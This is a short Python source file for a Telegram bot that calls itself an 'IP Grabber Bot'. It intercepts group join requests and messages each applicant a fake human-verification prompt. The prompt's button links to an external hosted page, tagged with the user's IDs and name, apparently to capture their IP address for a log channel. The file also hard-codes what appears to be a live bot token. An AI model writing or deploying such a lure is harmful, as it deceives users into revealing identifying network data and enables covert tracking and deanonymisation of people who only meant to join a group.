import telebot
from telebot import types

BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
LOG_CHANNEL = "-1002290475903"

bot = telebot.TeleBot(BOT_TOKEN)

@bot.chat_join_request_handler()
def handle_join_request(request: types.ChatJoinRequest):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Verify if you're human", url=link))

    try:
        bot.send_message(
            user_id,
            "✅ Human verification successful!\n\n"
            "Click the button below to verify you're human and join the group.\n\n"
            "Link will expire in 10 minutes.",
            reply_markup=markup
        )
        print(f"✅ Verification link sent to {user_id}")
    except Exception as e:
        print(f"❌ Failed to send PM to {user_id}: {e}")

print("✅ IP Grabber Bot is running...")
bot.infinity_polling(allowed_updates=['chat_join_request'])
